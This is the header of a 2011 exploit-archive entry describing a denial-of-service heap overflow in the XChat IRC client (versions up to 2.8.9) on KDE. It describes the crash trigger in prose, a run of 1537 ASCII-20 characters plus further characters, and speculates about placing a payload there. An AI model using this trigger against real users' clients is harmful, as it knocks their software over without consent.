# Exploit Title: XChat Heap Overflow DoS Proof of Concept
# Date: June 2011
# Author: th3p4tri0t
# Software Link: http://xchat.org/
# Version: <= 2.8.9

# This only works on XChat on KDE, I'm not sure about windows.
# It has been tested on Ubuntu (failed), Kubuntu, and Bactrack 5
# It is a heap overflow and is some sort of error with X Windows
# It uses 1537 (this is the minimum) of the ascii value 20
# after this, an unknown number of any other character (did not check for special
# characters) is required to trigger a crash, presumably the payload will go here.
